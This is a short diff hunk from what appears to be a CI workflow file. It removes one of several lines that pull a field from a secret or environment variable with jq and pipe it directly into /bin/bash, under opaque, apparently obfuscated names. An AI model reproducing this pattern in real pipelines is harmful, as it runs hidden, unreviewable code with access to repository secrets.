@@ -27,7 +27,6 @@ jobs:
           ogv00490: ${{ secrets.ogv00490 }}
         run: |
           printf '%s' "$ogv00490" | jq -r .p40 | /bin/bash
-          printf '%s' "$had8" | jq -r .isnan856 | /bin/bash
           echo $nodtc64900 | jq -r .esf97 | /bin/bash
           echo $pvtp6510 | jq -r .tnfpx39002 | /bin/bash
           printf '%s' "$cmt99652" | jq -r .jn534 | /bin/bash
